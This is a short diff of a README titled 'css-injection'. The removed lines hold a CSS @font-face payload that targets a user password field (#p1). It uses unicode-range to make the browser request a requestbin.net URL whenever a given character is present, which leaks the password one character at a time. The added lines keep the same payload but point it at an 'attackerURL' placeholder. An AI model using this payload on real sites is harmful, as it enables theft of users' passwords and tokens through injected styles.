@@ -1,12 +1,11 @@
 # css-injection
-Get token : 
-champs de mdp user #p1
+<h1>CRLF</h1>  \n
 
->@font-face{
-> font-family:poc;
-> src: url(2oup48x1s6rf06jj.b.requestbin.net/?C);
-> unicode-range:U+0043;
->}
->#p1{
-> font-family:poc;
->}
+
+>@font-face{ \n
+> font-family:poc; \n
+> src: url(attackerURL?C); \n
+>} \n
+>#p1{ \n
+> font-family:poc; \n
+>} \n
